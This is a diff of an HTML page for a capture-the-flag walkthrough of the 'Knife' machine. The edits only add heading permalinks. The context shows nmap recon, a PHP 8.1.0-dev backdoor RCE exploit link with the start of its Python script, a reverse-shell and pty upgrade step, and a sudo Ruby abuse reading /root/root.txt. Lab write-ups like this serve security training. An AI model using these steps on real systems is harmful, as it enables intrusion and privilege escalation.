@@ -910,8 +910,8 @@
               
                 
                 
-                <h1 id="overview">Overview</h1>
-<h2 id="machine-info">Machine Info</h2>
+                <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
+<h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <p><img alt="" src="../assets/image-20210523125944695.png" /></p>
 <table>
 <thead>
@@ -929,9 +929,9 @@
 </tr>
 </tbody>
 </table>
-<h1 id="walkthrough">Walkthrough</h1>
-<h2 id="recon">Recon</h2>
-<h3 id="nmap">nmap</h3>
+<h1 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>PORT   STATE SERVICE REASON  VERSION
 <span class="m">22</span>/tcp open  ssh     syn-ack OpenSSH <span class="m">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
 <span class="p">|</span> ssh-hostkey: 
@@ -948,11 +948,11 @@
 <span class="p">|</span>_http-title:  Emergent Medical Idea
 Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </code></pre></div>
-<h3 id="enumerate-web-service">Enumerate Web Service</h3>
+<h3 id="enumerate-web-service">Enumerate Web Service<a class="headerlink" href="#enumerate-web-service" title="Permanent link">&para;</a></h3>
 <p>By looking into the network tap in Firefox developer mode, we will find that the web service is running <code>PHP</code> version <code>8.1.0</code>, which is vulnerable to <strong>Remote Code Execution.</strong></p>
 <p><img alt="" src="../assets/image-20210523133359612.png" /></p>
-<h1 id="initial-foothold">Initial Foothold</h1>
-<h2 id="php-810-remote-code-execution">PHP 8.1.0 Remote Code Execution</h2>
+<h1 id="initial-foothold">Initial Foothold<a class="headerlink" href="#initial-foothold" title="Permanent link">&para;</a></h1>
+<h2 id="php-810-remote-code-execution">PHP 8.1.0 Remote Code Execution<a class="headerlink" href="#php-810-remote-code-execution" title="Permanent link">&para;</a></h2>
 <p>Exploit link: https://github.com/flast101/php-8.1.0-dev-backdoor-rce</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
 <span class="kn">import</span> <span class="nn">os</span>
@@ -997,8 +997,8 @@ $ id
 <span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span>
 </code></pre></div>
 <p>No we got user access into the machine. </p>
-<h1 id="privilege-escalation">Privilege Escalation</h1>
-<h2 id="upgrade-shell">Upgrade Shell</h2>
+<h1 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h1>
+<h2 id="upgrade-shell">Upgrade Shell<a class="headerlink" href="#upgrade-shell" title="Permanent link">&para;</a></h2>
 <p>Firstly, let's upgrade our shell using the following command: </p>
 <ul>
 <li>In local machine run netcat listener</li>
@@ -1016,7 +1016,7 @@ $ id
 <div class="highlight"><pre><span></span><code>python3 -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 </code></pre></div>
 <p><img alt="" src="../assets/image-20210523134337764.png" /></p>
-<h2 id="enumerate-the-target-machine">Enumerate The Target Machine</h2>
+<h2 id="enumerate-the-target-machine">Enumerate The Target Machine<a class="headerlink" href="#enumerate-the-target-machine" title="Permanent link">&para;</a></h2>
 <p>First, let's check user binaries that he can run as root</p>
 <div class="highlight"><pre><span></span><code>$ james@knife:/$ sudo -l 
 sudo -l 
@@ -1038,7 +1038,7 @@ User james may run the following commands on knife:
 </code></pre></div>
 <p>By looking into the script it seems like it runs <code>Ruby</code> as root privileges. </p>
 <p>So we can now run any <code>Ruby</code> script as root, we can abuse that by reading <code>root.txt</code> file </p>
-<h2 id="reading-roottxt-file">Reading <code>root.txt</code> File</h2>
+<h2 id="reading-roottxt-file">Reading <code>root.txt</code> File<a class="headerlink" href="#reading-roottxt-file" title="Permanent link">&para;</a></h2>
 <p>Firstly, I created to following <code>Ruby</code> script:</p>
 <div class="highlight"><pre><span></span><code><span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;/root/root.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
   <span class="n">f</span><span class="o">.</span><span class="n">each_line</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
